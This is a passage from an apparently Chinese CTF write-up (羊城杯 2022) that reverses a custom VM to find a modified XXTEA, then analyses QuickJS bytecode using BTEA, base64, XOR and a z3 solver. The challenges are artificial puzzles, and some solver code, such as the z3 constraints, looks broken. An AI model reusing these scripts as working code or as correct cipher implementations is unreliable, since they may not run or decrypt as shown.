class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xD7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">mem = [<span class="number">0x123</span>,<span class="number">0x234</span>,<span class="number">0x345</span>,<span class="number">0x456</span>]</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    v4 = r[<span class="number">16</span>]</span><br><span class="line">    r[<span class="number">16</span>] = v4+<span class="number">1</span></span><br><span class="line">    result = opcode[v4]-<span class="number">0xF1</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> v2==<span class="number">0xe0</span>:</span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v4 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v4 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v2&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">                v2 -= <span class="number">1</span></span><br><span class="line">                v4 = opcode[v1+<span class="number">2</span>] | (v4&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v4)&#125;</span>&#x27;</span>)</span><br><span class="line">        r[v3] = v4</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">1</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        tmp = v1</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = opcode[v1+<span class="number">2</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r[v2] == r[v3]:</span><br><span class="line">            v5 = v1+<span class="number">3</span>+v4</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> v5==<span class="number">512</span>:</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(mem[i]))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v5 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> v4:</span><br><span class="line">                r[<span class="number">16</span>] = v1+<span class="number">4</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v5 = opcode[v1+<span class="number">3</span>] | (v5&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v1 += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;if r[<span class="subst">&#123;v2&#125;</span>] != r[<span class="subst">&#123;v3&#125;</span>]: jmp <span class="subst">&#123;v5&#125;</span>&#x27;</span>)</span><br><span class="line">        r[<span class="number">16</span>] = v5</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">2</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v2 = opcode[v1]</span><br><span class="line">        v3 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        v4 = r[v3]</span><br><span class="line">        v5 = v1+<span class="number">4</span>*v4</span><br><span class="line">        v6 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">4</span>,<span class="number">0</span>,<span class="number">1</span>):</span><br><span class="line">            r[<span class="number">16</span>] = v5+<span class="number">3</span></span><br><span class="line">            v6 = opcode[v5+<span class="number">2</span>] | v6&lt;&lt;<span class="number">8</span></span><br><span class="line">            v5 += <span class="number">1</span></span><br><span class="line">        <span class="comment"># v6 = opcode[v5+2]&lt;&lt;24 | opcode[v5+3]&lt;&lt;16 | opcode[v5+4]&lt;&lt;8 | opcode[v5+5]</span></span><br><span class="line">        r[<span class="number">16</span>] = v5 - <span class="number">4</span>*r[v3]+<span class="number">14</span></span><br><span class="line">        r[v2] = v6</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v2&#125;</span>] = <span class="subst">&#123;<span class="built_in">hex</span>(v6)&#125;</span>   opcode[v1+4*r[opcode[v1+1]]+2]&lt;&lt;24 | opcode[v1+4*r[opcode[v1+1]]+3]&lt;&lt;16 | opcode[v1+4*r[opcode[v1+1]]+4]&lt;&lt;8 | opcode[v1+4*r[opcode[v1+1]]+5]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">3</span>:</span><br><span class="line">        v2 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = opcode[v2]</span><br><span class="line">        v4 = opcode[v2+<span class="number">1</span>]</span><br><span class="line">        v5 = r[v4]</span><br><span class="line">        r[<span class="number">16</span>] = v2+<span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> opcode[v2+<span class="number">2</span>]==<span class="number">0xe2</span>:</span><br><span class="line">            mem[v5] = r[v3]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;mem[<span class="subst">&#123;v5&#125;</span>] = r[<span class="subst">&#123;v3&#125;</span>]&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r[v3] = mem[v5]</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v2)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v3&#125;</span>] = mem[<span class="subst">&#123;v5&#125;</span>]&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">13</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\treturn&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> result == <span class="number">14</span>:</span><br><span class="line">        v1 = r[<span class="number">16</span>]</span><br><span class="line">        v3 = v1+<span class="number">2</span></span><br><span class="line">        v4 = opcode[v1]</span><br><span class="line">        v5 = opcode[v1+<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> v4 == <span class="number">0xe0</span>:</span><br><span class="line">            v6 = v1+<span class="number">3</span></span><br><span class="line">            r[<span class="number">16</span>] = v1+<span class="number">3</span></span><br><span class="line">            v7 = r[opcode[v1+<span class="number">2</span>]]</span><br><span class="line">            s = <span class="string">f&#x27;r[<span class="subst">&#123;opcode[v1+<span class="number">2</span>]&#125;</span>]&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v7 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span>(v4&lt;&lt;<span class="number">24</span>):</span><br><span class="line">                r[<span class="number">16</span>] = v3+<span class="number">1</span></span><br><span class="line">                v4 -= <span class="number">1</span></span><br><span class="line">                v7 = opcode[v3] | (v7&lt;&lt;<span class="number">8</span>)</span><br><span class="line">                v3 += <span class="number">1</span></span><br><span class="line">            s = <span class="built_in">hex</span>(v7)</span><br><span class="line">            v6 = v3</span><br><span class="line">        r[<span class="number">16</span>] = v6+<span class="number">1</span></span><br><span class="line">        res = opcode[v6]-<span class="number">0xff</span>-<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> res == -<span class="number">11</span>:</span><br><span class="line">            r[v5] = (r[v5] +v7)&amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] += &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">10</span>:</span><br><span class="line">            r[v5] = (r[v5] - v7) &amp;<span class="number">0xffffffff</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] -= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">9</span>:</span><br><span class="line">            r[v5] *= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] *= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">8</span>:</span><br><span class="line">            r[v5] //= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] //= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">7</span>:</span><br><span class="line">            r[v5] &lt;&lt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &lt;&lt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">6</span>:</span><br><span class="line">            r[v5] &gt;&gt;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &gt;&gt;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">5</span>:</span><br><span class="line">            r[v5] ^= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] ^= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">4</span>:</span><br><span class="line">            r[v5] |= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] |= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">elif</span> res == -<span class="number">3</span>:</span><br><span class="line">            r[v5] &amp;= v7 </span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">f&#x27;r[<span class="subst">&#123;v5&#125;</span>] &amp;= &#x27;</span>+s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(v1)+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong2&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(r[<span class="number">16</span>])+<span class="string">&#x27;:\t&#x27;</span>+<span class="string">&#x27;wrong&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>（其中mem即为输入，手动代了几个数字方便调试）</p>
<p>按照流程，打印出7000+行代码，大致观察发现有明显的xxtea的特征，delta=0xf4f3f2f1，循环64轮，key=[0xf1f2f3f4,0xf5f6f7f8,0xf9fafbfc,0xfdfefff0]</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/25.png" alt="25"></p>
<p>解密无果，猜测有魔改，结果在开头和结尾又发现了一些加密。</p>
<p>开头将输入调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/26.png" alt="img"></p>
<p>结尾异或0xf8f7f6f5并调换位置</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/27.png" alt="img"></p>
<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x55D37604</span>, <span class="number">0xB5FFA19E</span>, <span class="number">0xC202F734</span>, <span class="number">0x963BE91F</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    a[i] ^= <span class="number">0xf8f7f6f5</span></span><br><span class="line">t = a[<span class="number">3</span>]</span><br><span class="line">a[<span class="number">3</span>] = a[<span class="number">0</span>]</span><br><span class="line">a[<span class="number">0</span>] = t</span><br><span class="line">t = a[<span class="number">1</span>]</span><br><span class="line">a[<span class="number">1</span>] = a[<span class="number">2</span>]</span><br><span class="line">a[<span class="number">2</span>] = t</span><br><span class="line">a2 = [<span class="number">0xf1f2f3f4</span>,<span class="number">0xf5f6f7f8</span>,<span class="number">0xf9fafbfc</span>,<span class="number">0xfdfefff0</span>]</span><br><span class="line">v5 = <span class="number">0xf4f3f2f1</span></span><br><span class="line"><span class="comment"># n = 52//len(a) + 6</span></span><br><span class="line">v8 = v5*<span class="number">64</span></span><br><span class="line">v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    j = <span class="built_in">len</span>(a)-<span class="number">2</span></span><br><span class="line">    v9 = a[j]</span><br><span class="line">    v6 = (v8&gt;&gt;<span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">    a[<span class="built_in">len</span>(a)-<span class="number">1</span>] = (a[<span class="built_in">len</span>(a)-<span class="number">1</span>] - (((v9 ^ a2[v6 ^ ((j+<span class="number">1</span>) &amp; <span class="number">3</span>)]) + (a[<span class="number">0</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[<span class="number">0</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[<span class="number">0</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">while</span>(j&gt;<span class="number">0</span>):</span><br><span class="line">        v9 = a[j-<span class="number">1</span>]</span><br><span class="line">        a[j] = (a[j] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">        j -= <span class="number">1</span></span><br><span class="line">    v9 = a[<span class="built_in">len</span>(a)-<span class="number">1</span>]</span><br><span class="line">    a[<span class="number">0</span>] = (a[<span class="number">0</span>] - (((v9 ^ a2[v6 ^ (j &amp; <span class="number">3</span>)]) + (a[j+<span class="number">1</span>] ^ v8)) ^ (((<span class="number">16</span> * v9) ^ (a[j+<span class="number">1</span>] &gt;&gt; <span class="number">3</span>)) + ((<span class="number">4</span> * a[j+<span class="number">1</span>]) ^ (v9 &gt;&gt; <span class="number">5</span>))))) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    v8 -= v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>]:                               <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>),<span class="built_in">chr</span>(a[i]&amp;<span class="number">0xff</span>),end=<span class="string">&#x27;&#x27;</span>,sep=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 1t_i5_3z_i5nt_it</span></span><br></pre></td></tr></table></figure>
<h3 id="easyjs"><a class="markdownIt-Anchor" href="#easyjs"></a> <strong>easyjs</strong></h3>
<p>quickjs,下载源码编译输出字节码，具体参考<a href="https://bbs.pediy.com/thread-259014.htm">https://bbs.pediy.com/thread-259014.htm</a></p>
<p>字节码中首先观察到了初始化一些常量函数以及字符串</p>
<p>可以很明显的看到一个大小写互换的base64表</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/28.png" alt="img"></p>
<p>得到字节码开始分析eval函数，这个相当于正常的main函数</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/29.png" alt="img"></p>
<p>这里的意思应该是encode64（enc1（））的意思，所以先调用enc1，然后再调用encode64</p>
<p>enc1里面就是一个BTEA delta mx key都很容易知道，上网上扒一个代码实现就行了</p>
<p>后面是一个错位异或，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/30.png" alt="img"></p>
<p>最后调用了func5 func6函数 func5函数是一个转大整数的方法，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/31.png" alt="img"></p>
<p>func6里面主要是一堆的逻辑运算，然后与已知量比较，</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/32.png" alt="32"></p>
<p>将data3 15个数字分为三组，然后进行比较，拿z3解一下</p>
<p>总结一下就是先逆出来逻辑运算、然后是异或、base64、BTEA写脚本解就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode, b64encode</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">data3 = [<span class="number">5911837666743816200</span>,</span><br><span class="line"><span class="number">5133585975960501272</span>,</span><br><span class="line"><span class="number">9082418069800623372</span>,</span><br><span class="line"><span class="number">9154480062992383756</span>,</span><br><span class="line"><span class="number">6848599583376686600</span>,</span><br><span class="line"><span class="number">147787617043219975</span>,</span><br><span class="line"><span class="number">6140429622497212985</span>,</span><br><span class="line"><span class="number">2526269866358605591</span>,</span><br><span class="line"><span class="number">4552892036882908959</span>,</span><br><span class="line"><span class="number">4543304157965338119</span>,</span><br><span class="line"><span class="number">4620825451554930944</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">5924901230665995531</span>,</span><br><span class="line"><span class="number">8808899373961281307</span>,</span><br><span class="line"><span class="number">8662527953563041043</span>]</span><br><span class="line"></span><br><span class="line">data4 = [<span class="number">2101524238053948931</span>,</span><br><span class="line"><span class="number">9154814254531429383</span>,</span><br><span class="line"><span class="number">8941618984500083987</span>]</span><br><span class="line"></span><br><span class="line">data = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    data5 = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">64</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    x = data5[<span class="number">0</span>]</span><br><span class="line">    y = data5[<span class="number">1</span>]</span><br><span class="line">    z = data5[<span class="number">2</span>]</span><br><span class="line">    w = data5[<span class="number">3</span>]</span><br><span class="line">    a = ~x &amp; z</span><br><span class="line">    b = (z &amp; ~x | (x&amp;y) | (z &amp; (~y)) | (x &amp; (~y)) ) ^ w</span><br><span class="line">    c = (z &amp; ~y &amp; x)| (z &amp; ((x &amp; y) | (y &amp; (~x)) | ~(y | x)))</span><br><span class="line">    d = (z &amp; ~x) | (x &amp; y) | (z &amp; ~y) | (x &amp; ~y)</span><br><span class="line">    e = (z &amp; ~x) | (x&amp;y) | (y&amp;z)</span><br><span class="line">    s = Solver()</span><br><span class="line">    s.add(a == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(b == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(c == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(d == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(e == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.add(y == data3[i*<span class="number">5</span>:i*<span class="number">5</span>+<span class="number">5</span>])</span><br><span class="line">    s.check()</span><br><span class="line">    m = s.model()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data5:</span><br><span class="line">        res.append(<span class="built_in">int</span>(<span class="built_in">str</span>(m[i])))</span><br><span class="line">    <span class="comment">#print(res)</span></span><br><span class="line">    </span><br><span class="line">    aa = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> res:</span><br><span class="line">        k = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            k.append(r &amp; <span class="number">0xff</span>)</span><br><span class="line">            r &gt;&gt;= <span class="number">8</span></span><br><span class="line">        aa += k</span><br><span class="line">    data += aa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">data[-<span class="number">1</span>] = data[-<span class="number">1</span>]^data[<span class="number">1</span>]</span><br><span class="line">data[-<span class="number">2</span>] = data[-<span class="number">2</span>]^data[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">3</span>, -<span class="number">1</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    data[i] ^= data[i+<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"> </span><br><span class="line">using namespace std;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#define DELTA 289739796</span></span><br><span class="line"><span class="comment">#define MX (((z &gt;&gt; 6) ^ (y &lt;&lt; 3)) + ((y &gt;&gt; 4) ^ (z &lt;&lt; 5)) ^ ((sum^y) + (secret[(p&amp;3)^e] ^ z)))  </span></span><br><span class="line"> </span><br><span class="line">  void btea(uint32_t *vector, <span class="built_in">int</span> n, uint32_t const secret[<span class="number">4</span>]) &#123;</span><br><span class="line">    uint32_t y, z, <span class="built_in">sum</span>;</span><br><span class="line">    unsigned p, rounds, e;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>) &#123;          </span><br><span class="line">      rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">      <span class="built_in">sum</span> = <span class="number">0</span>;</span><br><span class="line">      z = vector[n-<span 